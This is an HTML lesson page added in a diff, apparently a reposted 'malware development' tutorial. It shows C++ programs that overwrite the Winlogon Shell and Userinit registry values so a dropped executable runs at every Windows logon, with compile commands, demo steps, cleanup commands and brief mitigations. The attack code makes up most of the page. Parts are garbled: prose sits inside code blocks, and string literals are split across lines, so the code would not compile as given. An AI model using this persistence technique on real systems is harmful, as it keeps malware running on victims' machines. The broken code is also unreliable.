@@ -1,0 +1,227 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Malware development: persistence - part 7. Winlogon. Simple</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #33</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">Malware development: persistence - part 7. Winlogon. Simple</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Today I’ll wrote about the result of self-researching another persistence trick: Winlogon registry keys. winlogon The Winlogon process is responsible for user logon and logoff, startup and shutdown and locking the screen. Authors of malware could alter the registry entries that the Winlogon process uses to achieve persistence. The following registry keys must be modified in order to implement this persistence technique:</p>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</span></div></div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">However, local administrator privileges are required to implement this technique.</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">First of all create our malicious application (hack.cpp):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+meow-meow messagebox
+author: @cocomelonc
+*/
+#include &lt;windows.h&gt;
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE
+hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+MessageBoxA(NULL, "Meow-meow!","=^..^=", MB_OK);
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, it’s just a pop-up “meow” message as usually. Let’s go to compile it: x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The generated hack.exe needs to be dropped into the victim’s machine. Changes to the Shell registry key that include an malicious app will result in the execution of both explorer.exe and hack.exe during Windows logon. This can be done immediately using the script below:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+pers.cpp
+windows persistence via winlogon keys
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2022/06/12/malware-pers-7.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+int main(int argc, char* argv[]) {
+HKEY hkey = NULL;
+// shell
+// const char* sh = "explorer.exe,
+// Z:\\2022-06-12-malware-pers-7\\hack.exe";
+const char* sh = "explorer.exe,hack.exe";
+// startup
+LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+(LPCSTR)
+"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+0 , KEY_WRITE, &amp;hkey);
+
+if (res == ERROR_SUCCESS) {
+// create new registry key
+// reg add
+// "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows
+// NT\CurrentVersion\Winlogon"
+// /v "Shell" /t REG_SZ /d "explorer.exe,..." /f
+RegSetValueEx(hkey, (LPCSTR)"Shell", 0, REG_SZ,
+(unsigned char*)sh, strlen(sh));
+RegCloseKey(hkey);
+}
+return 0;
+}
+Also, similar for Userinit. If this registry key include an malicious app will result in
+the execution of both userinit.exe and hack.exe during Windows logon:
+/*
+pers.cpp
+windows persistence via winlogon keys
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2022/06/12/malware-pers-7.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+int main(int argc, char* argv[]) {
+HKEY hkey = NULL;
+// userinit
+const char* ui = "C:\\Windows\\System32\\userinit.exe,
+Z:\\2022-06-12-malware-pers-7\\hack.exe";
+// startup
+LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+(LPCSTR)
+"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+0 , KEY_WRITE, &amp;hkey);
+if (res == ERROR_SUCCESS) {
+// create new registry key
+// reg add
+// "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows
+// NT\CurrentVersion\Winlogon"
+// /v "Shell" /t REG_SZ /d "explorer.exe,..." /f
+
+RegSetValueEx(hkey, (LPCSTR)"Userinit", 0,
+REG_SZ, (unsigned char*)ui, strlen(ui));
+RegCloseKey(hkey);
+}
+return 0;
+}
+So, compile the program responsible for persistence:
+x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
+-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
+-fdata-sections -Wno-write-strings -fno-exceptions \
+-fmerge-all-constants -static-libstdc++ \
+-static-libgcc -fpermissive
+
+demo
+And see everything in action. First of all, check registry keys:
+req query \
+"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" \
+/s
+
+Copy malicious app to C:\Windows\System32\. And run:
+
+.\pers.exe
+
+Then, logout and login:
+
+According to the logic of the our malicious program, “meow-meow” popped up:</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s check process properties via Process Hacker 2:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, cleanup: reg add \ "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" \ /v "Shell" /t REG_SZ /d "explorer.exe" /f</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">What about another key Userinit.exe? Let’s check. Run: .\pers.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Logout and login:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, for the purity of experiment, check properties of hack.exe in Process Hacker 2:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, parent process is winlogon.exe. Cleanup: reg add \ "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">NT\CurrentVersion\Winlogon" \ /v "Userinit" /t REG_SZ /d \ "C:\Windows\System32\userinit.exe" /f</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see in both cases, the malware will be executed during Windows authentication. But there are interesting caveat. For example if we update registry key as following logic:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+pers.cpp
+windows persistence via winlogon keys
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2022/06/12/malware-pers-7.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+int main(int argc, char* argv[]) {
+HKEY hkey = NULL;
+// shell
+const char* sh = "explorer.exe,
+Z:\\2022-06-12-malware-pers-7\\hack.exe";
+
+// startup
+LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+(LPCSTR)
+"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+0 , KEY_WRITE, &amp;hkey);
+if (res == ERROR_SUCCESS) {
+// create new registry key
+// reg add
+// "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows
+// NT\CurrentVersion\Winlogon" /v
+// "Shell" /t REG_SZ /d "explorer.exe,..." /f
+RegSetValueEx(hkey, (LPCSTR)"Shell", 0,
+REG_SZ, (unsigned char*)sh, strlen(sh));
+RegCloseKey(hkey);
+}
+return 0;
+}
+That is, our malware is located along the path: Z:\...\hack.exe instead of
+C:\Windows\System32\hack.exe.
+Run:
+.\pers.exe
+req query "HKLM\Software\Microsoft\Windows
+NT\CurrentVersion\Winlogon" /s
+
+And relogin:
+
+Checking properties of hack.exe:
+
+As you can see, parent process is Non-existent process. Parent will show as
+Non-existent process since userinit.exe terminates itself.
+There is one more note. Also, the Notify registry key is commonly present in older
+operating systems (prior to Windows 7) and it points to a notification package DLL
+file that manages Winlogon events. If you replace the DLL entries under this registry
+key with any other DLL, Windows will execute it during logon.
+What about mitigations? Limit user account privileges so that only authorized administrators can modify the Winlogon helper. Tools such as Sysinternals Autoruns may also
+be used to detect system modifications that may be attempts at persistence, such as the
+listing of current Winlogon helper values.
+This persistence trick is used by Turla group and software like Gazer and Bazaar in the
+wild.
+MITRE ATT&amp;CK - Boot or Logon Autostart Execution: Winlogon Helper DLL
+Turla
+Gazer backdoor
+Bazaar
+source code on Github</code></pre>
+            </div></main></body></html>
